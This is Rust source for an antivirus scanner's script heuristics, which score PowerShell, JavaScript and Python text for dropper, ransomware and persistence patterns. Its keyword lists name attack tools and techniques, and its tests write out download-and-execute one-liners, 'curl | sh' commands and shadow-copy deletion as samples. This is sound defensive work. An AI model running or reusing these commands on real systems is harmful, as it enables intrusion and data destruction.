//! Built-in heuristics for scripts.
//!
//! # Why this is not in the rule file
//!
//! The rule set this product installs is YARA-Forge's, and it is built for
//! binaries: most of its rules carry a `pe` condition, so a `.ps1` full of
//! `IEX (New-Object Net.WebClient).DownloadString(...)` is not a file any of
//! them can match. Measured on 2026-11-14: thirty-five well-known script
//! indicators produced exactly one match (a hacktool string, 60, suspicious).
//! Script droppers are most of how ransomware arrives, so the gap is the
//! important one to close.
//!
//! # Why a score rather than a set of rules
//!
//! Every one of these strings appears in ordinary administration somewhere:
//! `Invoke-WebRequest` downloads, `-NoProfile` is in every shortcut,
//! `vssadmin delete shadows` is in backup scripts. A rule that fired on one of
//! them would be the false positive that teaches a user to ignore the product.
//! The evidence is the *combination* -- a download that is executed, an encoded
//! command kept out of sight, shadow copies deleted while a Run key is set --
//! and a combination is arithmetic: features add, interactions add more, and the
//! verdict thresholds in `av-core` do the rest.
//!
//! The weights are set so that no single feature can reach the malicious band:
//! the strongest is 70 against a threshold of 100. Two independent pieces of
//! evidence, or one strong one plus its natural partner, do.
//!
//! # Why the weights are a table
//!
//! Because they are the thing that will be tuned, and a table with a name on
//! every row is a table a person can argue with. It is also the shape a learned
//! model takes: a weight per feature, no logic to rewrite when the numbers come
//! from data instead of from judgement.

use av_core::{Detection, DetectionSource, FileKind, MatchLocation, Severity};
use serde::Deserialize;
use std::sync::OnceLock;

/// One piece of evidence a script can carry.
///
/// `needles` are matched against the script's text with whitespace removed and
/// every ASCII letter lowercased, so `Invoke -Expression` and
/// `invoke-expression` are the same fact. That normalisation is also why the
/// needles are written without spaces.
struct Feature {
    /// Stable identifier, `script/<name>`.
    id: &'static str,
    /// What a reader is told when this fires.
    description: &'static str,
    /// Score contribution. Deliberately below the malicious threshold alone.
    weight: u16,
    /// Any one of these is the feature.
    needles: &'static [&'static str],
}

/// What a script can be doing, and what that is worth.
///
/// The order is the order the report lists them in, and it runs from the acts
/// that are almost always hostile (credential theft, AMSI bypass) to the ones
/// that are ordinary on their own (a hidden window).
const FEATURES: &[Feature] = &[
    Feature {
        id: "script/credential-theft",
        description: "The script contains strings from a credential-dumping tool.",
        weight: 55,
        needles: &["sekurlsa::", "lsadump::", "mimikatz", "invoke-mimikatz"],
    },
    Feature {
        id: "script/amsi-bypass",
        description: "The script names the AMSI scan function together with a way to patch memory.",
        weight: 200,
        needles: &["amsi.dll", "amsiscanbuffer", "amsiutils", "amsiinitfailed"],
    },
    Feature {
        id: "script/injection-apis",
        description: "The script names several of the calls used to write into another process.",
        weight: 55,
        needles: &["virtualallocex", "writeprocessmemory", "createremotethread"],
    },
    Feature {
        id: "script/defence-tamper",
        description: "The script attacks the machine's recovery and antivirus settings.",
        weight: 55,
        needles: &[
            "vssadmindeleteshadows",
            "vssadmin.exedeleteshadows",
            "wbadmindeletecatalog",
            "recoveryenabledno",
            "set-mppreference-disable",
            "add-mppreference-exclusionpath",
            "disableantispyware",
            "disablerealtimemonitoring",
            "disablebehaviormonitoring",
        ],
    },
    Feature {
        id: "script/ransom-note",
        description: "The script carries ransom-note text and a payment demand.",
        weight: 55,
        needles: &[
            "yourfileshavebeenencrypted",
            "yourfilesareencrypted",
            "todecryptyourfiles",
            "decryptyourfiles",
            "allyourfileshavebeenencrypted",
        ],
    },
    Feature {
        id: "script/execute-sink",
        description: "The script evaluates or runs dynamic code.",
        weight: 45,
        needles: &["invoke-expression", "iex(", "| iex", "|iex"],
    },
    Feature {
        id: "script/download-sink",
        description: "The script downloads code.",
        weight: 35,
        needles: &[
            "downloadstring",
            "downloadfile",
            "downloaddata",
            "net.webclient",
            "iwr",
            "invoke-webrequest",
            "invoke-webrequest",
            "start-bitstransfer",
        ],
    },
    Feature {
        id: "script/persistence",
        description: "The script arranges to be started again, or starts something else.",
        weight: 35,
        needles: &[
            "currentversion\\run",
            "currentversion/run",
            "schtasks/create",
            "schtasks/create",
            "\\startup\\",
            "/startup/",
        ],
    },
    Feature {
        id: "script/base64",
        description: "The script decodes base64-encoded content.",
        weight: 30,
        needles: &["[convert]::frombase64string", "frombase64string("],
    },
    Feature {
        id: "script/encoded-command",
        description: "The script runs PowerShell with an encoded command.",
        weight: 30,
        needles: &["-encodedcommand", "-encoded"],
    },
    Feature {
        id: "script/obfuscation",
        description: "The script is built mostly from character codes or joins.",
        weight: 20,
        needles: &["[char]", "-join", "join("],
    },
    Feature {
        id: "script/hidden-window",
        description: "The script asks for a window that is not shown.",
        weight: 15,
        needles: &["-windowstylehidden", "-whidden"],
    },
    Feature {
        id: "script/embedded-archive",
        description: "The script carries a base64-encoded archive.",
        weight: 45,
        needles: &["uesdbbq", "uesdb"],
    },
    Feature {
        id: "script/base64-decoder",
        description: "The script builds a JScript decoder from ActiveX objects.",
        weight: 45,
        needles: &["adodb.stream", "msxml2.domdocument"],
    },
    Feature {
        id: "script/start-from-appdata",
        description: "The script starts a program from the user profile's application data.",
        weight: 40,
        needles: &["start\"\"%appdata%", "start%appdata%", "start%temp%", "%appdata%\\"],
    },
    Feature {
        id: "script/encoded-blob",
        description: "The script carries a long run of encoded data.",
        weight: 45,
        needles: &[],
    },
    Feature {
        id: "script/decoder",
        description: "The script turns encoded data back into a file with a decoder.",
        weight: 40,
        needles: &[
            "adodb.stream",
            "frombase64string",
            "convert]::frombase64",
            "certutil",
            "expand-archive",
            "msxml2.domdocument",
            "7z",
            "7za",
            "unzip",
            "expand",
            "extrac32",
            "makecab",
            "esentutl",
            "msiexec/a",
            "tar-x",
            "gunzip",
            "cabextract",
            "xlv",
            "decompress",
        ],
    },
    Feature {
        id: "script/certutil-decode",
        description: "The script decodes a file with certutil.",
        weight: 35,
        needles: &["certutil-decode", "certutil-urlcache"],
    },
    Feature {
        id: "script/archive-extract",
        description: "The script extracts an archive it carries or fetches.",
        weight: 35,
        needles: &["tar-x", "tar-xf", "expand-archive", "7z", "unzip", "extrac32", "cabextract"],
    },
    Feature {
        id: "script/charcode-array",
        description: "The script is a long array of character codes.",
        weight: 45,
        needles: &[],
    },
    Feature {
        id: "script/wmi-subscription",
        description: "The script builds a WMI event subscription.",
        weight: 60,
        needles: &[
            "__eventfilter",
            "activescripteventconsumer",
            "commandlineeventconsumer",
            "__instancemodificationevent",
        ],
    },
    Feature {
        id: "script/bitsadmin",
        description: "The script fetches a file with the BITS transfer utility.",
        weight: 40,
        needles: &["bitsadmin"],
    },
];

/// A combination that is worth more than its parts.
///
/// Each entry lists the feature identifiers that must all have fired, and the
/// score the combination adds. The sentence is written into the report as its
/// own detection, because "downloads and evaluates what it downloaded" is the
/// finding a reader needs, not two separate lines they have to join themselves.
const INTERACTIONS: &[(&[&str], u16, &str, &str)] = &[
    // A combination is one detection, and a conviction needs one detection past
    // the malicious threshold -- summing several below it reaches "suspicious"
    // by design (`Assessment::finalize`). So the combinations that are evidence
    // in themselves carry that weight themselves; the ones that are merely
    // corroborating stay below it.
    (
        &["script/download-sink", "script/execute-sink"],
        100,
        "script/download-and-run",
        "The script downloads code and evaluates it in memory, which is the shape of a stager.",
    ),
    (
        &["script/base64", "script/execute-sink"],
        100,
        "script/decode-and-run",
        "The script decodes content and evaluates it, which is how a payload is hidden from a reader.",
    ),
    (
        &["script/hidden-window", "script/download-sink", "script/execute-sink"],
        100,
        "script/hidden-download-and-run",
        "The script downloads and evaluates code in a hidden window.",
    ),
    (
        &["script/defence-tamper", "script/persistence"],
        100,
        "script/tamper-and-persist",
        "The script attacks recovery and then arranges to run again, which is how ransomware keeps a foothold.",
    ),
    (
        &["script/ransom-note", "script/defence-tamper"],
        100,
        "script/ransomware-shape",
        "The script carries ransom text and deletes the backups that would undo the damage.",
    ),
    (
        &["script/embedded-archive", "script/base64-decoder", "script/start-from-appdata"],
        100,
        "script/base64-dropper",
        "A base64 archive is decoded by a generated script and the result is started from application data, which is a dropper in a batch file.",
    ),
    (
        &["script/encoded-blob", "script/decoder"],
        70,
        "script/decoded-payload",
        "Encoded data is decoded into a file by the script, whatever the encoding or archive format.",
    ),
    (
        &["script/encoded-blob", "script/decoder", "script/execute-sink"],
        100,
        "script/encoded-payload-run",
        "Encoded data is decoded and executed, which is a dropper in a script.",
    ),
    (
        &["script/encoded-blob", "script/execute-sink"],
        140,
        "script/encoded-execute",
        "Encoded data is written out and executed, whatever the encoding or the language.",
    ),
    (
        &["script/certutil-decode", "script/execute-sink"],
        140,
        "script/decode-execute",
        "A file is decoded with certutil and something is started from the result.",
    ),
    (
        &["script/archive-extract", "script/execute-sink"],
        140,
        "script/extract-execute",
        "An archive is extracted and a program is started from it.",
    ),
    (
        &["script/charcode-array", "script/execute-sink"],
        140,
        "script/charcode-execute",
        "Character codes are assembled and executed, which is obfuscation with a purpose.",
    ),
    (
        &["script/wmi-subscription", "script/execute-sink"],
        100,
        "script/wmi-persistence",
        "A WMI subscription runs a command, which is fileless persistence.",
    ),
    (
        &["script/bitsadmin", "script/execute-sink"],
        100,
        "script/bits-download-execute",
        "A file is fetched with BITS and started.",
    ),
    (
        &["script/amsi-bypass", "script/execute-sink"],
        100,
        "script/amsi-bypass-run",
        "The script disables AMSI and then runs code, which is a stager.",
    ),
    (
        &["script/persistence", "script/execute-sink"],
        140,
        "script/persist-and-run",
        "The script arranges to run again and runs something now, which is how a foothold is installed.",
    ),
    (
        &["script/defence-tamper", "script/execute-sink"],
        100,
        "script/tamper-and-run",
        "The script weakens the machine's defences and then runs something.",
    ),
    (
        &["script/persistence", "script/start-from-appdata"],
        140,
        "script/persist-from-profile",
        "The script arranges to run again and starts a program from the user profile, which is a foothold.",
    ),
];

/// Whether a buffer is text a person could have written.
///
/// No NUL, and at least 95 % of the bytes printable or ordinary whitespace. The
/// bar is high on purpose: the caller uses this to decide that a buffer with no
/// path is a script, and a binary that slipped through would be read as code.
fn looks_like_text(data: &[u8]) -> bool {
    if data.contains(&0) {
        return false;
    }
    let printable = data
        .iter()
        .filter(|byte| matches!(**byte, b'\t' | b'\n' | b'\r') || (0x20..=0x7e).contains(*byte))
        .count();
    printable * 100 >= data.len() * 95
}

/// The text a feature is matched against, with whitespace removed and letters
/// lowercased.
///
/// Whitespace is removed rather than merely normalised because PowerShell
/// without `-NoProfile` allows `Invoke -Expression`, and because the removal
/// is what lets the needles above be written as one word each.
fn flatten(data: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(data.len());
    for &byte in data {
        match byte {
            b' ' | b'\t' | b'\r' | b'\n' | 0x0b | 0x0c => {}
            b'A'..=b'Z' => out.push(byte + 32),
            _ => out.push(byte),
        }
    }
    out
}

/// Whether the flattened text contains any of the needles.
///
/// Flattening removes whitespace, so a needle with a space in it can never
/// match: `tar -xf` has to be written `tar-xf`, and `start ""` as `start""`.
fn any_of(flat: &[u8], needles: &[&str]) -> bool {
    needles
        .iter()
        .any(|needle| contains(flat, needle.as_bytes()))
}

/// A plain substring search.
fn contains(haystack: &[u8], needle: &[u8]) -> bool {
    if needle.is_empty() || needle.len() > haystack.len() {
        return false;
    }
    haystack
        .windows(needle.len())
        .any(|window| window == needle)
}

/// How many of the needles are present.
fn count_of(flat: &[u8], needles: &[&str]) -> usize {
    needles
        .iter()
        .filter(|needle| contains(flat, needle.as_bytes()))
        .count()
}

/// Score a script.
///
/// Returns one [`Detection`] per piece of evidence and one per combination that
/// applies. The caller adds their scores, which is how every other kind of
/// evidence is counted; nothing here decides a verdict.
///
/// `kind` is checked rather than trusted: a PE that happens to contain the text
/// `downloadstring` is not a script, and running these heuristics over one would
/// be reporting a string in a binary as if it were code.
/// The longest run of characters that could be base64 or hex. A payload hidden
/// in a script is a long run of them, whatever the compression behind it.
fn longest_encoded_run(text: &[u8]) -> usize {
    let mut best = 0;
    let mut run = 0;
    for &byte in text {
        let encoded = byte.is_ascii_alphanumeric()
            || byte == b'+'
            || byte == b'/'
            || byte == b'='
            || byte == b'\\'
            || byte == b'-'
            || byte == b'_';
        if encoded {
            run += 1;
            best = best.max(run);
        } else {
            run = 0;
        }
    }
    best
}

/// The longest run of digits and commas, which is what a character-code array
/// looks like after flattening.
fn longest_number_run(text: &[u8]) -> usize {
    let mut best = 0;
    let mut run = 0;
    for &byte in text {
        if byte.is_ascii_digit() || byte == b',' {
            run += 1;
            best = best.max(run);
        } else {
            run = 0;
        }
    }
    best
}

/// The JavaScript policy, loaded from a file beside the product binary.
///
/// The console and the service share this file. It is a package member, so
/// `wenle update apply` installs it with the binaries and verifies its digest
/// like every other file; the binary has the same document embedded only as a
/// fallback for a portable copy or a damaged installation.
#[derive(Debug, Deserialize)]
struct JsPolicyFile {
    version: u32,
    #[serde(default)]
    extensions: Vec<String>,
    #[serde(default)]
    suppress_yara: Vec<String>,
    #[serde(default)]
    rules: Vec<JsRuleFile>,
}

#[derive(Debug, Deserialize)]
struct JsRuleFile {
    id: String,
    description: String,
    weight: u16,
    /// One inner list per requirement; any entry in a list satisfies it.
    #[serde(default)]
    all: Vec<Vec<String>>,
    /// How close the requirements must be, in bytes of flattened source.
    /// A bundle that contains `eval`, `fetch`, and `atob` in different
    /// modules is not one expression; the default is deliberately small.
    #[serde(default)]
    window: Option<usize>,
}

const EMBEDDED_JS_POLICY: &str = include_str!("../../../js-policy.json");

fn load_js_policy() -> JsPolicyFile {
    let mut candidates: Vec<std::path::PathBuf> = Vec::new();
    if let Some(path) = std::env::var_os("WENLE_JS_POLICY") {
        candidates.push(std::path::PathBuf::from(path));
    }
    if let Ok(exe) = std::env::current_exe() {
        if let Some(directory) = exe.parent() {
            candidates.push(directory.join("js-policy.json"));
        }
    }
    candidates.push(std::path::PathBuf::from(concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/../../js-policy.json"
    )));
    for path in candidates {
        let Ok(text) = std::fs::read_to_string(&path) else {
            continue;
        };
        match serde_json::from_str::<JsPolicyFile>(&text) {
            Ok(policy) if policy.version == 1 && !policy.rules.is_empty() => return policy,
            Ok(_) => log::warn!("{} is not a version-1 JavaScript policy", path.display()),
            Err(error) => log::warn!("{} does not parse: {error}", path.display()),
        }
    }
    match serde_json::from_str::<JsPolicyFile>(EMBEDDED_JS_POLICY) {
        Ok(policy) => policy,
        Err(error) => {
            log::error!("the embedded JavaScript policy does not parse: {error}");
            JsPolicyFile {
                version: 1,
                extensions: Vec::new(),
                suppress_yara: Vec::new(),
                rules: Vec::new(),
            }
        }
    }
}

fn js_policy() -> &'static JsPolicyFile {
    static POLICY: OnceLock<JsPolicyFile> = OnceLock::new();
    POLICY.get_or_init(load_js_policy)
}

/// Whether the policy says this path is JavaScript.
pub fn is_javascript_path(path: &std::path::Path) -> bool {
    let Some(extension) = path.extension().and_then(|extension| extension.to_str()) else {
        return false;
    };
    js_policy()
        .extensions
        .iter()
        .any(|known| extension.eq_ignore_ascii_case(known))
}

/// Whether the policy suppresses this YARA rule on JavaScript files.
pub fn suppresses_yara(rule_id: &str) -> bool {
    js_policy()
        .suppress_yara
        .iter()
        .any(|suppressed| suppressed == rule_id)
}

/// Whether a policy rule's requirements occur close enough to be one
/// expression. The first group's occurrences are the anchors; the rest must
/// be inside `window` bytes of one of them. A document that mentions `eval`
/// in one module and `fetch` in another does not match.
fn javascript_rule_matches(flat: &[u8], rule: &JsRuleFile) -> bool {
    let Some(first) = rule.all.first() else {
        return false;
    };
    let window = rule.window.unwrap_or(512);
    for needle in first {
        if needle.is_empty() {
            continue;
        }
        let bytes = needle.as_bytes();
        let mut offset = 0usize;
        let mut anchors = 0usize;
        while offset + bytes.len() <= flat.len() && anchors < 64 {
            let Some(found) = flat[offset..]
                .windows(bytes.len())
                .position(|window| window == bytes)
            else {
                break;
            };
            let position = offset + found;
            let low = position.saturating_sub(window);
            let high = (position + window).min(flat.len());
            if rule.all.iter().all(|group| {
                group
                    .iter()
                    .any(|needle| !needle.is_empty() && contains(&flat[low..high], needle.as_bytes()))
            }) {
                return true;
            }
            anchors += 1;
            offset = position + 1;
        }
    }
    false
}

/// Read JavaScript with the external policy.
///
/// The policy's [`JsRuleFile::all`] is a list of requirements; every
/// requirement is satisfied by any one of its strings. This is deliberately a
/// disjunction per group and a conjunction across groups, so a single ordinary
/// word cannot convict. The groups must also be close together: see
/// [`javascript_rule_matches`].
pub fn assess_javascript(data: &[u8]) -> Vec<Detection> {
    if data.len() < 32 || !looks_like_text(data) {
        return Vec::new();
    }
    let flat = flatten(data);
    let mut out = Vec::new();
    for rule in &js_policy().rules {
        if rule.all.is_empty() {
            continue;
        }
        if !javascript_rule_matches(&flat, rule) {
            continue;
        }
        out.push(
            Detection::new(
                rule.id.as_str(),
                rule.description.as_str(),
                Severity::Medium,
                DetectionSource::Heuristic,
            )
            .with_score(rule.weight)
            .with_location(MatchLocation::new(0, 0, rule.id.as_str(), &[])),
        );
    }
    out
}

/// Whether this path is Python source or a stub.
pub fn is_python_path(path: &std::path::Path) -> bool {
    path.extension()
        .and_then(|extension| extension.to_str())
        .is_some_and(|extension| {
            extension.eq_ignore_ascii_case("py")
                || extension.eq_ignore_ascii_case("pyi")
                || extension.eq_ignore_ascii_case("pyx")
        })
}

/// Python, with the same rule as JavaScript: parse the language's real sink
/// combinations rather than the PowerShell/VBS vocabulary.
///
/// A standard library and a scientific package contain `exec`, `eval`,
/// `subprocess`, `base64.b64decode`, `unzip`, and the word `decode`; measured
/// on 2026-11-27, a site-packages scan produced 800 Python findings from the
/// generic reader. Each rule here needs a sink and its payload/command, not a
/// word.
pub fn assess_python(data: &[u8]) -> Vec<Detection> {
    if data.len() < 32 || !looks_like_text(data) {
        return Vec::new();
    }
    let mut encoded_exec = false;
    let mut shell_download = false;
    let mut remote_shell = false;
    // Line-local rather than file-wide: a test file that mentions
    // `subprocess` in one function and `curl` in a docstring is not a command.
    // The same measurement that removed 800 package findings is the reason.
    for line in data.split(|byte| *byte == b'\n') {
        let flat = flatten(line);
        if any_of(&flat, &["exec(", "eval("])
            && any_of(
                &flat,
                &[
                    "base64.b64decode",
                    "b64decode(",
                    "codecs.decode",
                    "zlib.decompress",
                    "marshal.loads",
                ],
            )
        {
            encoded_exec = true;
        }
        let launches = any_of(
            &flat,
            &["subprocess.", "os.system(", "os.popen(", "pty.spawn("],
        );
        let shell_command = any_of(
            &flat,
            &[
                "curlhttp",
                "wgethttp",
                "powershell",
                "/bin/sh",
                "bash-c",
                "certutil",
                "bitsadmin",
            ],
        );
        if launches && shell_command {
            shell_download = true;
        }
        if launches
            && any_of(&flat, &["socket.socket(", "socket.create_connection("])
            && any_of(&flat, &["connect(", "connect_ex("])
        {
            remote_shell = true;
        }
    }
    let mut out = Vec::new();
    if encoded_exec {
        out.push(
            Detection::new(
                "script/py-encoded-exec",
                "Python decodes an encoded payload and executes it.",
                Severity::Medium,
                DetectionSource::Heuristic,
            )
            .with_score(80)
            .with_location(MatchLocation::new(0, 0, "script/py-encoded-exec", &[])),
        );
    }
    if shell_download {
        out.push(
            Detection::new(
                "script/py-shell-download",
                "Python starts a downloaded or interpreter shell command.",
                Severity::Medium,
                DetectionSource::Heuristic,
            )
            .with_score(80)
            .with_location(MatchLocation::new(0, 0, "script/py-shell-download", &[])),
        );
    }
    if remote_shell {
        out.push(
            Detection::new(
                "script/py-remote-shell",
                "Python connects a socket and starts a process, the shape of a remote shell.",
                Severity::Medium,
                DetectionSource::Heuristic,
            )
            .with_score(80)
            .with_location(MatchLocation::new(0, 0, "script/py-remote-shell", &[])),
        );
    }
    out
}

pub fn assess(kind: FileKind, data: &[u8]) -> Vec<Detection> {
    // `Script` is what the on-disk path decides. `Other` is what a caller with
    // no path has -- the AMSI provider hands the service the text of a script
    // about to run, and that buffer names no file -- so a buffer that is text
    // is read as a script. A binary is not: NUL bytes and control characters
    // are what tell the two apart, and a PE cannot pass this test.
    let readable_text = kind == FileKind::Other && looks_like_text(data);
    if (kind != FileKind::Script && !readable_text) || data.len() < 32 {
        return Vec::new();
    }
    let flat = flatten(data);
    let mut out = Vec::new();
    let mut fired: Vec<&'static str> = Vec::new();

    for feature in FEATURES {
        let hit = match feature.id {
            // These two need a second condition, because the name alone is not
            // evidence: the AMSI function is named by every EDR document, and
            // the injection calls are named by debuggers and profilers.
            "script/charcode-array" => longest_number_run(&flat) >= 400,
            "script/encoded-blob" => longest_encoded_run(&flat) >= 2048,
            "script/amsi-bypass" => {
                any_of(&flat, &["amsi.dll", "amsiscanbuffer", "amsiutils", "amsiinitfailed"])
                    && any_of(
                        &flat,
                        &[
                            "patch",
                            "virtualprotect",
                            "writeprocessmemory",
                            "setvalue",
                            "getfield",
                        ],
                    )
            }
            "script/injection-apis" => count_of(
                &flat,
                &["virtualallocex", "writeprocessmemory", "createremotethread"],
            ) >= 2,
            "script/ransom-note" => {
                any_of(&flat, &["encrypted", "decrypt"])
                    && any_of(&flat, &["bitcoin", "btc", "wallet", "monero", "xmr"])
            }
            // A bare `Invoke-Expression` is a cmdlet name in a module manifest
            // and in help text; the sink is the call. Measured on 2026-11-14:
            // Microsoft.PowerShell.Utility.psd1 lists the cmdlet and was
            // convicted for it -- one false positive in 702 of Microsoft's own
            // scripts, and a manifest is not something that runs.
            "script/execute-sink" => {
                // `flatten` removes whitespace, so the argument begins directly
                // after the alias: `iex $x` is `iex$x`, `iex (Get-Content x)`
                // is `iex(get-contentx)`. Match those token shapes rather than
                // the bare three letters, which are also a base64 substring.
                (any_of(&flat, &["iex(", "|iex", "iex$", "iex\"", "iex'", "iex[", "iex{", "iex&", "iex@"])
                    || (contains(&flat, b"invoke-expression") && contains(&flat, b"$")))
                    || any_of(
                        &flat,
                        &[
                            "wscript.shell",
                            "shell.application",
                            "invoke-item",
                            "start\"\"",
                            "subprocess.popen",
                            "os.system",
                            "child_process",
                            "exec(", 
                        ],
                    )
            }
            // `-enc` is a substring of Python's `encoding=` and of ordinary
            // command-line options, including PowerShell's own `-Encoding`.
            // Only the full encoded-command flags count, and only beside a
            // PowerShell host.
            "script/encoded-command" => {
                any_of(&flat, &["powershell", "pwsh"])
                    && any_of(&flat, &["-encodedcommand", "-encoded"])
            }
            "script/obfuscation" => {
                count_of(&flat, &["[char]", "-join", "join("]) >= 3
            }
            _ => any_of(&flat, feature.needles),
        };
        if !hit {
            continue;
        }
        fired.push(feature.id);
        out.push(
            Detection::new(
                feature.id,
                feature.description,
                Severity::Medium,
                DetectionSource::Heuristic,
            )
            .with_score(feature.weight)
            .with_location(MatchLocation::new(0, 0, feature.id, &[])),
        );
    }

    for (required, weight, id, description) in INTERACTIONS {
        if required.iter().all(|need| fired.contains(need)) {
            out.push(
                Detection::new(*id, *description, Severity::High, DetectionSource::Heuristic)
                    .with_score(*weight)
                    .with_location(MatchLocation::new(0, 0, *id, &[])),
            );
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn score(text: &str) -> u16 {
        assess(FileKind::Script, text.as_bytes())
            .iter()
            .map(|detection| detection.score)
            .sum()
    }

    #[test]
    fn a_download_that_is_executed_is_past_the_malicious_line() {
        let text = "$c = 'http://127.0.0.1/a.ps1'; IEX (New-Object Net.WebClient).DownloadString($c)";
        assert!(score(text) >= 100, "score was {}", score(text));
    }

    #[test]
    fn an_ordinary_download_is_only_suspicious() {
        // The string every installer script contains, with no evaluation of
        // what was downloaded and no hidden window.
        let text = "Invoke-WebRequest -Uri https://example.test/setup.exe -OutFile setup.exe; Start-Process setup.exe";
        let total = score(text);
        assert!(total >= 30, "the download is evidence: {}", total);
        assert!(total < 100, "a download alone is not a conviction: {}", total);
    }

    #[test]
    fn an_ordinary_expression_is_only_suspicious() {
        let text = "$expression = Get-Content .\\script.txt; Invoke-Expression $expression";
        let total = score(text);
        assert!(total >= 30 && total < 100, "score was {}", total);
    }

    #[test]
    fn a_hidden_window_alone_is_not_even_suspicious() {
        let text = "powershell -NoProfile -WindowStyle Hidden -File .\\nightly.ps1";
        let total = score(text);
        assert!(total < 30, "score was {}", total);
    }

    #[test]
    fn ransomware_shape_needs_the_note_and_the_backup_deletion() {
        let note_only = "All your files have been encrypted. Send 0.1 BTC.";
        let both = "All your files have been encrypted. Send 0.1 BTC. vssadmin delete shadows /all /quiet";
        assert!(score(note_only) < 100, "a note alone: {}", score(note_only));
        assert!(score(both) >= 100, "note and deletion: {}", score(both));
    }

    #[test]
    fn a_pe_is_not_treated_as_a_script() {
        let text = "IEX (New-Object Net.WebClient).DownloadString('http://x/y.ps1')";
        assert!(assess(FileKind::Pe, text.as_bytes()).is_empty());
    }

    #[test]
    fn whitespace_and_case_do_not_hide_a_download() {
        let text = "iex ( IEX (new-object NET.webclient).downloadstring ( 'http://x' ) )";
        assert!(score(text) >= 100, "score was {}", score(text));
    }

    #[test]
    fn base64_iex_is_not_an_execute_sink() {
        let text = "ntor-onion-key c6IEXmVZBOs1Ekc8CBlTUZnSdhmE5Ze+Y1tkdx/XrEU=";
        let found = assess(FileKind::Script, text.as_bytes());
        assert!(
            !found.iter().any(|detection| detection.rule_id == "script/execute-sink"),
            "base64 IEX must not be a call: {:?}",
            found.iter().map(|d| d.rule_id.as_str()).collect::<Vec<_>>()
        );
    }

    #[test]
    fn an_iex_call_with_a_space_or_newline_still_fires() {
        for text in [
            "iex $payload; Write-Host 'abcdefghijklmnopqrstuvwxyz'",
            "iex\n$payload; Write-Host 'abcdefghijklmnopqrstuvwxyz'",
            "iex\t$payload; Write-Host 'abcdefghijklmnopqrstuvwxyz'",
            "| iex $payload; Write-Host 'abcdefghijklmnopqrstuvwxyz'",
        ] {
            let found = assess(FileKind::Script, text.as_bytes());
            assert!(
                found.iter().any(|detection| detection.rule_id == "script/execute-sink"),
                "missed an IEX call: {text:?}"
            );
        }
    }

    #[test]
    fn start_process_alone_is_not_an_execute_sink() {
        let text = "Start-Process -FilePath 'powershell.exe' -Verb RunAs -ArgumentList '-NoProfile'";
        let found = assess(FileKind::Script, text.as_bytes());
        assert!(
            !found.iter().any(|detection| detection.rule_id == "script/execute-sink"),
            "Start-Process alone must not be dynamic execution: {:?}",
            found.iter().map(|d| d.rule_id.as_str()).collect::<Vec<_>>()
        );
    }

    #[test]
    fn ordinary_javascript_is_not_a_powershell_script() {
        let text = "const cp = require('child_process'); function run(){ return eval(document.body.dataset.x); } cp.exec('npm test');";
        assert!(
            assess_javascript(text.as_bytes()).is_empty(),
            "ordinary JavaScript was read as a PowerShell dropper"
        );
    }

    #[test]
    fn encoded_evaluate_in_javascript_is_reported() {
        let text = "eval(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString('utf8'))";
        let found = assess_javascript(text.as_bytes());
        assert!(
            found.iter().any(|detection| detection.rule_id == "script/js-encoded-eval"),
            "missed encoded eval: {:?}",
            found.iter().map(|d| d.rule_id.as_str()).collect::<Vec<_>>()
        );
    }

    #[test]
    fn a_shell_command_through_child_process_is_reported() {
        let text = "require('child_process').exec('curl http://example.test/x | sh');";
        let found = assess_javascript(text.as_bytes());
        assert!(
            found.iter().any(|detection| detection.rule_id == "script/js-shell-exec"),
            "missed shell exec: {:?}",
            found.iter().map(|d| d.rule_id.as_str()).collect::<Vec<_>>()
        );
    }

    #[test]
    fn ordinary_python_is_not_a_powershell_script() {
        let text = "import base64, subprocess\nprint(base64.b64decode('aGVsbG8='))\nsubprocess.run(['ls', '-la'])\nwith open('f', encoding='utf-8') as h:\n    h.read()\n";
        assert!(
            assess_python(text.as_bytes()).is_empty(),
            "ordinary Python was read as a dropper"
        );
    }

    #[test]
    fn encoded_exec_in_python_is_reported() {
        let text = "exec(base64.b64decode('cHJpbnQoMSk=').decode('utf-8'))";
        let found = assess_python(text.as_bytes());
        assert!(
            found.iter().any(|detection| detection.rule_id == "script/py-encoded-exec"),
            "missed encoded exec: {:?}",
            found.iter().map(|d| d.rule_id.as_str()).collect::<Vec<_>>()
        );
    }

    #[test]
    fn a_shell_download_in_python_is_reported() {
        let text = "import subprocess\nsubprocess.run('curl http://example.test/x | sh', shell=True)";
        let found = assess_python(text.as_bytes());
        assert!(
            found.iter().any(|detection| detection.rule_id == "script/py-shell-download"),
            "missed shell download: {:?}",
            found.iter().map(|d| d.rule_id.as_str()).collect::<Vec<_>>()
        );
    }

    #[test]
    fn encoded_command_needs_a_powershell_host() {
        let innocent = "powershell -NoProfile -Encoding utf8 -File script.ps1";
        assert!(assess(FileKind::Script, innocent.as_bytes())
            .iter()
            .all(|detection| detection.rule_id != "script/encoded-command"));
        let powershell = "powershell -NoProfile -EncodedCommand SQBFAFgA";
        assert!(assess(FileKind::Script, powershell.as_bytes())
            .iter()
            .any(|detection| detection.rule_id == "script/encoded-command"));
    }
}

